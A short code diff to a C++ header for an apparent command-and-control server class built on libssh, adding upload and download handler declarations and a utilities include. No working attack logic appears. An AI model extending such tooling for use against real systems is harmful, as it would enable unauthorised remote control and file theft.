@@ -9,6 +9,7 @@
 #include <thread>
 #include "libssh/libssh.h"
 #include "libssh/server.h"
+#include "utils.h"
 
 #define KEYS_FOLDER "/Users/rip/.ssh/"
 
@@ -33,6 +34,8 @@ private:
     bool openChannel();
     void sendMsg(const std::string&);
     std::string rcvMsg();
+    void handleUpload(std::string&, std::string&);
+    void handleDownload(std::string&, std::string&);
 
 public:
     C2Server();
